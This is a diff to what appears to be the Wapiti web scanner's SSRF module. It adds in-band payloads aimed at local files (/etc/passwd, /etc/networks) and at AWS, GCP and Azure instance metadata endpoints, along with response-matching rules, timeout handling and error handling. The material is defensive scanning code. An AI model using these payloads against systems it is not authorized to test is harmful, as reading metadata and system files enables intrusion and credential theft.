@@ -21,17 +21,68 @@ from asyncio import sleep
 from typing import Optional, Iterator
 from binascii import hexlify, unhexlify
 
-from httpx import RequestError
+from httpx import ReadTimeout, RequestError
 
-from wapitiCore.main.log import logging, log_red, log_verbose
+from wapitiCore.main.log import logging, log_red, log_orange, log_verbose
 from wapitiCore.attack.attack import Attack, Mutator, Parameter, ParameterSituation
 from wapitiCore.language.vulnerability import Messages
 from wapitiCore.definitions.ssrf import SsrfFinding
+from wapitiCore.definitions.resource_consumption import ResourceConsumptionFinding
+from wapitiCore.definitions.internal_error import InternalErrorFinding
 from wapitiCore.model import PayloadInfo, str_to_payloadinfo
 from wapitiCore.net import Request, Response
 from wapitiCore.net.web import http_repr
 
 SSRF_PAYLOAD = "{external_endpoint}ssrf/{random_id}/{path_id}/{hex_param}/"
+
+# In-band payloads: if the application fetches and reflects the content,
+# these patterns will appear in the HTTP response.
+SSRF_INBAND_PAYLOADS = [
+    # Linux file disclosure via file:// scheme
+    {
+        "payload": "file:///etc/passwd",
+        "rules": ["root:x:0:0", "daemon:x:"],
+    },
+    {
+        "payload": "file:///etc/networks",
+        "rules": ["loopback", "link-local"],
+    },
+    # Windows file disclosure via file:// scheme
+    {
+        "payload": "file:///c:/windows/system32/drivers/etc/networks",
+        "rules": ["loopback"],
+    },
+    # AWS EC2 instance metadata
+    {
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "rules": ["ami-id", "instance-id", "instance-type"],
+    },
+    # GCP instance metadata
+    {
+        "payload": "http://metadata.google.internal/computeMetadata/v1/",
+        "rules": ["attributes/"],
+    },
+    # Azure instance metadata
+    {
+        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "rules": ["azEnvironment", "resourceGroupName"],
+    },
+]
+
+
+def _make_payload_info(payload: str, rules: Optional[list] = None) -> PayloadInfo:
+    """Build a PayloadInfo with detection rules for in-band matching."""
+    info = PayloadInfo(payload=payload)
+    info.rules = rules or []
+    return info
+
+
+def _search_patterns(content: str, patterns: list) -> str:
+    """Return the first pattern found in content, or empty string."""
+    for pattern in patterns:
+        if pattern in content:
+            return pattern
+    return ""
 
 
 class ModuleSsrf(Attack):
@@ -52,34 +103,135 @@ class ModuleSsrf(Attack):
             request: Optional[Request] = None,
             parameter: Optional[Parameter] = None,
     ) -> Iterator[PayloadInfo]:
-        """Load the payloads from the specified file"""
-        # The payload will contain the parameter name in hex-encoded format
-        # If the injection is made directly in the query string (no parameter) then the payload would be
-        # the hex value of "QUERY_STRING"
+        """Generate SSRF payloads: one OOB payload for the external endpoint,
+        then in-band payloads targeting local files and cloud metadata services."""
         if parameter.situation == ParameterSituation.QUERY_STRING and parameter.name == "":
             parameter_name = "QUERY_STRING"
         else:
             parameter_name = parameter.name
 
-        payload = SSRF_PAYLOAD.format(
+        # 1) Out-of-band payload: relies on the external endpoint callback
+        oob_payload = SSRF_PAYLOAD.format(
             external_endpoint=self.external_endpoint,
             random_id=self._session_id,
             path_id=request.path_id,
             hex_param=hexlify(parameter_name.encode("utf-8", errors="replace")).decode()
         )
-        yield PayloadInfo(payload=payload)
+        yield _make_payload_info(oob_payload, rules=[])
+
+        # 2) In-band payloads: detectable via response content analysis
+        for entry in SSRF_INBAND_PAYLOADS:
+            yield _make_payload_info(entry["payload"], rules=entry["rules"])
+
+    async def _check_false_positive(self, request: Request, pattern: str) -> bool:
+        """Send the original request without payload to check if the pattern already exists."""
+        try:
+            response = await self.crawler.async_send(request)
+        except RequestError:
+            self.network_errors += 1
+            return False
+        return pattern in response.content
 
     async def attack(self, request: Request, response: Optional[Response] = None):
-        # Let's just send payloads, we don't care of the response as what we want to know is if the target
-        # contacted the endpoint.
-        for mutated_request, _parameter, _payload in self.mutator.mutate(request, self.get_payloads):
+        timeouted = False
+        page = request.path
+        saw_internal_error = False
+        current_parameter = None
+        vulnerable_parameter = False
+
+        for mutated_request, parameter, payload_info in self.mutator.mutate(request, self.get_payloads):
+            if current_parameter != parameter:
+                # New parameter: reset vulnerability tracking
+                current_parameter = parameter
+                vulnerable_parameter = False
+            elif vulnerable_parameter:
+                # Already found a vuln for this parameter, skip to the next one
+                continue
+
             log_verbose(f"[¨] {mutated_request}")
 
             try:
-                await self.crawler.async_send(mutated_request)
+                response = await self.crawler.async_send(mutated_request)
+            except ReadTimeout:
+                self.network_errors += 1
+                if timeouted:
+                    continue
+
+                log_orange("---")
+                log_orange(Messages.MSG_TIMEOUT, page)
+                log_orange(Messages.MSG_EVIL_REQUEST)
+                log_orange(http_repr(mutated_request))
+                log_orange("---")
+
+                if parameter.is_qs_injection:
+                    anom_msg = Messages.MSG_QS_TIMEOUT
+                else:
+                    anom_msg = Messages.MSG_PARAM_TIMEOUT.format(parameter.display_name)
+
+                await self.add_medium(
+                    finding_class=ResourceConsumptionFinding,
+                    request=mutated_request,
+                    info=anom_msg,
+                    parameter=parameter.display_name,
+                )
+                timeouted = True
             except RequestError:
                 self.network_errors += 1
                 continue
+            else:
+                # In-band detection: check response content for matching patterns
+                if payload_info.rules:
+                    pattern = _search_patterns(response.content, payload_info.rules)
+                    if pattern and not await self._check_false_positive(request, pattern):
+                        if parameter.is_qs_injection:
+                            vuln_message = Messages.MSG_QS_INJECT.format(self.MSG_VULN, page)
+                        else:
+                            vuln_message = (
+                                f"{self.MSG_VULN} via injection in the parameter {parameter.display_name}"
+                            )
+
+                        await self.add_high(
+                            finding_class=SsrfFinding,
+                            request=mutated_request,
+                            info=vuln_message,
+                            parameter=parameter.display_name,
+                            response=response
+                        )
+
+                        log_red("---")
+                        log_red(
+                            Messages.MSG_QS_INJECT if parameter.is_qs_injection else Messages.MSG_PARAM_INJECT,
+                            self.MSG_VULN,
+                            page,
+                            parameter.display_name
+                        )
+                        log_red(Messages.MSG_EVIL_REQUEST)
+                        log_red(http_repr(mutated_request))
+                        log_red("---")
+
+                        vulnerable_parameter = True
+                        continue
+
+                if response.is_server_error and not saw_internal_error:
+                    saw_internal_error = True
+                    if parameter.is_qs_injection:
+                        anom_msg = Messages.MSG_QS_500
+                    else:
+                        anom_msg = Messages.MSG_PARAM_500.format(parameter.display_name)
+
+                    await self.add_high(
+                        finding_class=InternalErrorFinding,
+                        request=mutated_request,
+                        info=anom_msg,
+                        parameter=parameter.display_name,
+                        response=response
+                    )
+
+                    log_orange("---")
+                    log_orange(Messages.MSG_500, page)
+                    log_orange(Messages.MSG_EVIL_REQUEST)
+                    log_orange(http_repr(mutated_request))
+                    log_orange("---")
 
     async def finish(self):
         endpoint_url = f"{self.internal_endpoint}get_ssrf.php?session_id={self._session_id}"
@@ -98,7 +250,11 @@ class ModuleSsrf(Attack):
                 for request_id in data:
                     original_request = await self.persister.get_path_by_id(request_id)
                     if original_request is None:
-                        raise ValueError("Could not find the original request with that ID")
+                        logging.warning(
+                            "[!] Could not find original request with ID %s, skipping",
+                            request_id
+                        )
+                        continue
 
                     page = original_request.path
                     for hex_param in data[request_id]:
